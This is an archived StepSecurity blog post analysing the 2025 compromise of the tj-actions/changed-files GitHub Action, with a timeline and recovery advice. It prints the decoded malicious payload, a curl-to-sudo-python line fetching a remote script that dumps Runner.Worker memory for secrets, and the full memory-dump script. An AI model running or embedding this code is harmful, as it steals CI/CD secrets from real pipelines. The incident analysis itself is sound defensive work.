---
url: "https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised"
title: "Harden-Runner detection: tj-actions/changed-files action is compromised - StepSecurity"
captured: "2026-11-02T19:00:48Z"
via: "live"
sha256: "a358165d29858bd416987609feeb87a9ae77866b3e32abd293d04aefb392651c"
wayback: "https://web.archive.org/web/20261023025354/https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised"
cited_in:
  - "docs/threats/06-credential-and-secret-protection.md"
---

# Harden-Runner detection: tj-actions/changed-files action is compromised - StepSecurity

> Archived copy of a third-party page, kept so Bigman's findings survive if the original goes away. Copyright stays with the original publisher; cite the original URL.
>
> Original: <https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised>
> Snapshot: <https://web.archive.org/web/20261023025354/https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised>

[Back to Blog](https://www.stepsecurity.io/blog)

[Threat Intel](https://www.stepsecurity.io/blog?category=Threat Intel)

# Harden-Runner detection: tj-actions/changed-files action is compromised

We have concluded our investigation into the tj-actions/changed-files compromise. This post explains how the attack worked, how we detected it, and what steps you should take to secure your CI/CD environment.

Varun Sharma

[View LinkedIn](https://www.linkedin.com/in/varunsharma07)

March 14, 2025

[Share on X](https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised#)[Share on X](https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised#)[Share on LinkedIn](https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised#)[Share on Facebook](https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised#)[Follow our RSS feed](https://www.stepsecurity.io/blog/rss.xml)

Table of Contents

[Loading nav...](https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised#)

-

- https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised#

## Introduction

We have concluded our investigation into the critical security incident involving the `tj-actions/changed-files` GitHub Action. The issue has been reported to GitHub, and an official CVE — [CVE-2025-30066](https://github.com/advisories/GHSA-mrrh-fwg8-r2c3) — has been published to track the incident. You can find more details in [GitHub Issue #2463](https://github.com/tj-actions/changed-files/issues/2463).

Based on our findings, the Action was compromised and posed a significant risk by exposing CI/CD secrets in public build logs. This post provides a summary of the incident, how it was detected, and the steps users can take to recover and secure their environments. We recommend replacing all instances of `tj-actions/changed-files` with the secure alternative maintained by StepSecurity: `step-security/changed-files`.

‍[StepSecurity Harden-Runner](https://github.com/step-security/harden-runner) detected this issue through anomaly detection when an unexpected endpoint appeared in the network traffic. Based on our analysis, the incident started around 9:00 AM March 14th, 2025 Pacific Time (PT) / 4:00 PM March 14th, 2025 UTC.

StepSecurity has released a free secure drop-in replacement for this Action to help recover from the incident: [step-security/changed-files](https://github.com/step-security/changed-files). We highly recommend you replace all instances of tj-actions/changed-files with the StepSecurity secure alternatives.

### Timeline of Key Updates

March 14, 2025 5:00 PM UTC – Our initial investigation confirmed that most versions of `tj-actions/changed-files` were compromised.

March 14, 2025 8:00 PM UTC – We identified multiple public repositories leaking secrets in build logs. Users were advised to follow recovery steps immediately.

March 15, 2025 2:00 PM UTC – GitHub removed the `tj-actions/changed-files` Action, making it unavailable to workflows.

March 15, 2025 10:00 PM UTC – GitHub restored the repository. All versions of the Action were cleaned, and no longer included the malicious code.

March 16, 2025 6:00 AM UTC – We announced a community Office Hour to help answer questions and support recovery efforts.

March 17, 2025 6:00 PM UTC – The [recording of the Office Hour](https://www.youtube.com/watch?v=6KugZXHAdeQ&t=116s)was published, providing an overview of the incident and recommendations.

March 18, 2025 2:30 AM UTC – Our investigation uncovered that [several Actions in the `reviewdog` GitHub organization were also compromised](https://www.stepsecurity.io/blog/reviewdog-github-actions-are-compromised).

## Summary of the incident

‍
The tj-actions/changed-files GitHub Action, which is currently used in over 23,000 repositories, has been compromised. In this attack, the attackers modified the action’s code and retroactively updated multiple version tags to reference the malicious commit. The compromised Action prints CI/CD secrets in GitHub Actions build logs. If the workflow logs are publicly accessible (such as in public repositories), anyone could potentially read these logs and obtain exposed secrets. There is no evidence that the leaked secrets were exfiltrated to any remote network destination. Here is the sequence of events that led to this supply chain attack.

- The adversary compromised a Personal Access Token (PAT) linked to the @tj-actions-bot bot account to which the maintainer used for maintaining the repository. The exact attack method to compromise this PAT is unknown.
- They created the malicious commit outside of the Action repository. Details about this malicious commit is shared below.
- The updated all Action release tags to point to the malicious commit. With this change, the Action started executing the adversary provided malicious code.

You can refer to the [issue comments](https://github.com/tj-actions/changed-files/issues/2463#issuecomment-2727015784) provided by the maintainer for more details.

Our Harden-Runner solution flagged this issue when an unexpected endpoint appeared in the workflow’s network traffic. This anomaly was caught by Harden-Runner’s behavior-monitoring capability.

The compromised Action now executes a malicious Python script that dumps CI/CD secrets from the Runner Worker process. Most of the existing Action release tags have been updated to refer to the malicious commit mentioned below ([@stevebeattie](https://gist.github.com/stevebeattie) notified us about [these compromised tags](https://gist.github.com/stevebeattie/1847841fb3b1bfbf6d8449ae2fb0e8a2)). Note: All these tags now point to the same malicious commit hash:0e58ed8671d6b60d0890c21b07f8835ace038e67, indicating the retroactive compromise of multiple versions.”

```
$ git tag -l | while read -r tag ; do git show --format="$tag: %H" --no-patch $tag ; done | sort -k2
v1.0.0: 0e58ed8671d6b60d0890c21b07f8835ace038e67
...
v35.7.7-sec: 0e58ed8671d6b60d0890c21b07f8835ace038e67
...
v44.5.1: 0e58ed8671d6b60d0890c21b07f8835ace038e67
...
v5: 0e58ed8671d6b60d0890c21b07f8835ace038e67
...
```

[@salolivares](https://github.com/salolivares) has identified the malicious commit that introduces the exploit code in the Action.

The base64 encoded string in the above screenshot contains the exploit code. Here is the base64 decoded version of the code.
‍

```
if [[ "$OSTYPE" == "linux-gnu" ]]; then
  B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`
  echo $B64_BLOB
else
  exit 0
fi

```

‍

Here is the content of https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py

```
#!/usr/bin/env python3
...

def get_pid():
    # https://stackoverflow.com/questions/2703640/process-list-on-linux-via-python
    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]

    for pid in pids:
        with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as cmdline_f:
            if b'Runner.Worker' in cmdline_f.read():
                return pid

    raise Exception('Can not get pid of Runner.Worker')

if __name__ == "__main__":
    pid = get_pid()
    print(pid)

    map_path = f"/proc/{pid}/maps"
    mem_path = f"/proc/{pid}/mem"

    with open(map_path, 'r') as map_f, open(mem_path, 'rb', 0) as mem_f:
        for line in map_f.readlines():  # for each mapped region
            m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
            if m.group(3) == 'r':  # readable region
                start = int(m.group(1), 16)
                end = int(m.group(2), 16)
                # hotfix: OverflowError: Python int too large to convert to C long
                # 18446744073699065856
                if start > sys.maxsize:
                    continue
                mem_f.seek(start)  # seek to region start

                try:
                    chunk = mem_f.read(end - start)  # read region contents
                    sys.stdout.buffer.write(chunk)
                except OSError:
                    continue
```

‍

Even though GitHub shows renovate as the commit author, most likely the commit did not actually come up renovate bot. The commit is an un-verified commit, so likely the adversary provided renovate as the commit author to hide their tracks.

## StepSecurity Harden-Runner

[StepSecurity Harden-Runner](https://github.com/step-security/harden-runner) secures CI/CD workflows by controlling network access and monitoring activities on GitHub-hosted and self-hosted runners. The name "Harden-Runner" comes from its purpose: strengthening the security of the runners used in GitHub Actions workflows. The Harden-Runner community tier is free for open-source projects. In addition, it offers several enterprise features.

‍

## Reproducing the Exploit

When this Action is executed with Harden-Runner, you can see the malicious code in action. We reproduced the exploit in a test repository. When the compromised tj-actions/changed-files action runs, Harden-Runner’s insights clearly show it downloading and executing a malicious Python script that attempts to dump sensitive data from the GitHub Actions runner’s memory. You can see the behavior in the [StepSecurity dashboard](https://app.stepsecurity.io/github/step-security/github-actions-goat/actions/runs/13866127357)
To reproduce this, we ran the following workflow:

```
name: "tj-action changed-files incident"
jobs:
  changed_files:
   ....
    steps:
      - name: Harden Runner
        uses: step-security/harden-runner@v2
        with:
          disable-sudo: true
          egress-policy: audit
     ...
      - name: Get changed files
        id: changed-files
        uses: tj-actions/changed-files@v35
     ...
```

When this workflow is executed, you can see the malicious behavior through Harden-Runner:

https://app.stepsecurity.io/github/step-security/github-actions-goat/actions/runs/13866127357

‍

When this workflow runs, you can observe the malicious behavior in the Harden-Runner insights page. The compromised Action downloads and executes a malicious Python script, which attempts to dump sensitive data from the Actions Runner process memory.

## Recovery Steps

🚨 If you are using any version of the tj-actions/changed-files Action, we strongly recommend you stop using it immediately until the incident is resolved. To support the community during this incident, we have released a free, secure, and drop-in replacement: [step-security/changed-files](https://github.com/step-security/changed-files). We recommend updating all instances of j-actions/changed-files in your workflows to this StepSecurity-maintained Action.

### Use the StepSecurity maintained changed-files Action

[StepSecurity Maintained Actions](https://docs.stepsecurity.io/actions/stepsecurity-actions) are usually exclusive to StepSecurity enterprise customers. However, in an effort to help the community with the inci, we are making this StepSecurity Maintained Action freely available to everyone.

To use the StepSecurity maintained Action, simply replace all instances of "tj-actions/changed-files@vx" with "step-security/changed-files@3dbe17c78367e7d60f00d78ae6781a35be47b4a1 # v45.0.1" or "step-security/changed-files@v45".

For enhanced security, you can pin to the specific commit SHA:

```
...
jobs:
  changed_files:
    runs-on: ubuntu-latest
      ...
      - name: Get changed files
        id: changed-files
        uses: step-security/changed-files@v45
      ...
```

You can also reference the Action through its latest release tag:

```
...
jobs:
  changed_files:
    runs-on: ubuntu-latest
      ...
      - name: Get changed files
        id: changed-files
        uses: step-security/changed-files@3dbe17c78367e7d60f00d78ae6781a35be47b4a1 # v45.0.1
      ...
```

For more details, please refer to [README of the project](https://github.com/step-security/changed-files?tab=readme-ov-file#stepsecurity-maintained-changed-files-action).

### Review Actions Inventory

You should perform a [code search](https://github.com/search?q=org%3Aactions%20tj-actions%2Fchanged-files%20Action&type=code) across your repositories to discover all instances of the tj-actions/changed-files Action.
‍
Please note that this GitHub search does not always return accurate results. If you have dedicated source code search solutions such as SourceGraph, they could be more effective with finding all instances of this Action in use.

### Review GitHub Actions Workflow Run Logs

You should review logs for the recent executions of the Action and see if it has leaked secrets. Below is an example of how leaked secrets appear in build logs.

‍

This step is especially important for public repositories since their logs are publicly accessible.

### Rotate Leaked Secrets

If you discover any secrets in GitHub Actions workflow run logs, rotate them immediately.

### Pin GitHub Actions

You should pin your GitHub Actions to full-length commit SHAs to make sure that your workflows always use immutable references. StepSecurity community tier allows maintainers to pin Actions to their full-length commit SHAs for free. You can read about StepSecurity automation to pin Actions [here](https://www.stepsecurity.io/blog/pinning-github-actions-for-enhanced-security-a-complete-guide#community-tier).

### For StepSecurity Enterprise Customers

The following steps are applicable only for StepSecurity enterprise customers. If you are not an existing enterprise customer, you can start our 14 day free trial by installing [the StepSecurity GitHub App](https://github.com/apps/stepsecurity-actions-security) to complete the following recovery steps:

#### Discover Leaked Secrets

We have added a new control specifically to detect leaked secrets in build logs due to this security incident. You can find the new control on the StepSecurity dashboard.

If you have any leaked secrets, you can click on the control to view the list of all workflows that have leaked secrets.

You can then click on the links in the "Failed Runs" section to confirm the leaked secrets in build logs.

You should rotate these leaked secrets (if applicable) and delete these workflow runs so that the logs with leaked secrets are no longer available.

#### Review Actions Inventory

You can use the Actions inventory feature to discover all GitHub Actions workflows that are using tj-actions/changed-files.

‍
‍

#### Review Harden-Runner Findings

You can see if your workflows have called "gist.githubusercontent.com" by visiting "All Destinations" in your StepSecurity dashboard. If this endpoint appears in the list, review the workflow runs that called this endpoint.

‍

#### StepSecurity Maintained changed-files Action

We offer [secure drop-in replacements for risky third-party Actions](https://docs.stepsecurity.io/actions/stepsecurity-actions) as part of our enterprise tier. We have created a [maintained Action](https://github.com/step-security/changed-files/) for tj-actions/changed-files.

## Pin GitHub Actions across organization

You can use the StepSecurity pinning dashboard control to discover all Actions that are not pinned in your organization and pin it through automated pull requests.

### Enable Compromised Actions Run Policy

We have introduced a new Compromised Actions Run Policy to proactively block known-malicious GitHub Actions such as tj-actions/changed-files.

- Prevents execution of workflows using compromised Actions
- Maintains a curated list of known threats
- Cancels runs and leaves PR comments suggesting secure alternatives

You can add this policy by following this Interactive demo:

This policy acts as a real-time defense to stop supply chain attacks before they spread.

## Conclusion

This incident highlights the growing sophistication of supply chain attacks targeting CI/CD environments. While the immediate threat from the tj-actions/changed-files compromise has been contained, it serves as a powerful reminder that traditional static security measures are no longer enough.

We’re grateful to the security community for their collaboration and swift response. If you haven’t already, now is the time to review your workflows, rotate any potentially leaked secrets, and migrate to trusted, secure alternatives like step-security/changed-files.

👉 Want to know how secure your GitHub repositories are?
Scan your repositories with [Secure Repo](https://app.stepsecurity.io/secure-repo) to get actionable insights and identify hidden risks in minutes

Let’s keep pushing CI/CD security forward — together.
